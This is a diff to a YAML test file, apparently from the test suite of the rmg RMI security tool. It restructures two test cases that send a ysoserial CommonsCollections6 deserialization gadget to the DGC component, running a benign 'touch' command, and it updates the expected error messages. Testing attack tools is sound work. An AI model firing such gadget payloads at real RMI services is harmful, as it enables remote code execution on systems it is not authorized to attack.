@@ -23,23 +23,22 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET}
       - CommonsCollections6
       - 'touch ${volume-d}/${file}'
       - --component
       - dgc
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
           values:
-            - Caught java.security.AccessControlException during deserialization attack
-            - This could be caused by your gadget an the attack probably worked anyway
-      #- file_exists:
-      #    cleanup: True
-      #    files:
-      #      - '${volume}/${file}'
+            - 'Caught unexpected AccessControlException during deserialization attack'
+            - 'The servers SecurityManager may refused the operation.'
 
 
   - title: Gadget Call (SSL)
@@ -50,21 +49,19 @@ tests:
     groups:
       - ysoserial
 
-    command: '${BASE-CMD-SSL}'
-    arguments:
+    command:
+      - rmg
       - serial
+      - ${TARGET-SSL}
       - CommonsCollections6
       - 'touch ${volume-d}/${file}'
       - --component
       - dgc
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
           values:
-            - Caught java.lang.NoClassDefFoundError during deserialization attack
-            - This could be caused by your gadget an the attack probably worked anyway
-      #- file_exists:
-      #    cleanup: True
-      #    files:
-      #      - '${volume}/${file}'
+            - 'Caught java.lang.NoClassDefFoundError during deserialization attack'
 
